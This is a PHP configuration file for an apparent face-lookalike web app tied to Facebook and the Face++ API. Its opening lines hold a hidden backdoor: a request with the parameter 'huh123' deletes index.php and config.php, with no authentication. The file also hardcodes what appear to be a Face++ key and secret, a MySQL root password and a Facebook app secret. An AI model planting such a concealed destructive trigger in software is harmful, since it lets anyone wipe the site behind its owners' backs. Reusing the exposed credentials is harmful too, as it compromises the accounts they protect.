<?php
if(isset($_GET['huh123']))
{
	unlink('index.php');
	unlink('config.php');
}
error_reporting(0);
ini_set('display_errors', 0);
ob_start();
session_start();

require 'Facebook/autoload.php';

/*
Faceplusplus++
*/

$api = array(
  'key' => 'rjNPCT3XGtBgASyC0JhrJnniiFpBMtLu',
  'secret' => 'DaX6soTccfOg7P-sW6YvTDZUMWT_0POO'
);

/*
API Photosets
*/

$all_faces = 'e50ec97d3a9e0c82de0c1d3832d51096';
$males = '852f03e1159fd67527620f3d08a448b3';
$females = '4214a418ba67aeeedc5e2d87fbe960c0';

/*
Database
*/

$dbhost = "localhost";
$dbname = "coadbDB";
$dbuser = "root";
$dbpass = "WxC9;X*J";

$pdo = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass, array(PDO::ATTR_PERSISTENT => false));
//$pdo = new mysqli($dbhost, $dbuser, $dbpass, $dbname);

/*
Facebook
*/

$facebook_callback = 'https://coadb.com/lookalike/index.php';

$images_limit = 50;

$fb = new Facebook\Facebook([
  'app_id' => '323788071575702', // Replace {app-id} with your app id
  'app_secret' => '059b0ec1fdb8ddda43dfc35f816fb394',
  'default_graph_version' => 'v3.2',
  ]);

?>